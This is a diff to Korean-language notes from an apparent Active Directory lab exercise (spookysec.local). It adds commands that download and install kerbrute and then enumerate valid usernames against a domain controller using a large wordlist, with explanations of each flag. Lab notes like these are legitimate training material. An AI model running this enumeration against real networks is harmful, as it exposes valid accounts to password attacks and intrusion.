@@ -277,6 +277,16 @@ S-1-5-21-<도메인 식별자>-<RID> <도메인 이름>\<계정 이름> (<계정
 
 # Kerberos Enumeration
 
-수집된 유저 정보를 가지고 브루트포스 실행하기
+wget https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_linux_amd64 -O kerbrute
+chmod +x kerbrute
+sudo mv kerbrute /usr/local/bin/
+apt install golang
 
-kerberute --usernames userlist --domain spookysec.local --kdc
+# list 는 txt 파일로 저장되어야 합니다.
+
+kerbrute userenum --dc 10.10.206.91 -d spookysec.local -o found_users.txt /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -t 10
+
+dc: 도메인 컨트롤러의 IP 주소
+d: 도메인 이름 (spookysec.local)
+o: 결과를 저장할 파일 이름 (found_users.txt)
+t: 스레드 수 (동시 요청 수, 기본값은 10)
